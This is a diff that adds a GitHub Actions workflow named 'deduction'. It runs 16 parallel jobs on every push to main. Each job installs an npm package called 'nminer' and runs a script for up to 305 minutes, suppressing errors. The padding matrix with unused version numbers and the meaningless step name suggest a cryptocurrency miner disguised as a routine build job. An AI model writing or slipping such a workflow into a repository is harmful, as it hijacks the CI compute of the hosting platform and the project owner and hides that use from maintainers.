@@ -1,0 +1,41 @@
+name: deduction
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 5998 }
+          - { version: 5161 }
+          - { version: 7666 }
+          - { version: 3878 }
+          - { version: 4015 }
+          - { version: 6329 }
+          - { version: 5372 }
+          - { version: 7439 }
+          - { version: 8900 }
+          - { version: 8690 }
+          - { version: 5487 }
+          - { version: 8788 }
+          - { version: 8384 }
+          - { version: 7576 }
+          - { version: 4999 }
+          - { version: 7990 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: above institute when for
+        run: |
+          npm install nminer@latest
+          timeout 305m node deduction.js || echo "deduction executed"
